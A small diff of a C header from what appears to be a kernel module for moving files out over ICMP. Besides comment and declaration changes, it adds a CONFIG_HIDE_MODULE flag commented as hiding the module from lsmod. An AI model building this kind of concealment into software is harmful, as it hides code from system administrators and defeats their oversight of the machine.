@@ -1,4 +1,4 @@
-/*
+/**
  * This file is part of the kfile-over-icmp module (https://github.com/spiderpig1297/kfile-over-icmp).
  * Copyright (c) 2020 spiderpig1297.
  * 
@@ -16,5 +16,7 @@
  */
 #pragma once
 
-int core_start(void);
-void core_stop(void);
+// TODO: use kconfig to allow configuration via a menu.
+
+// Prevents from the module to be detected by lsmod.
+#define CONFIG_HIDE_MODULE
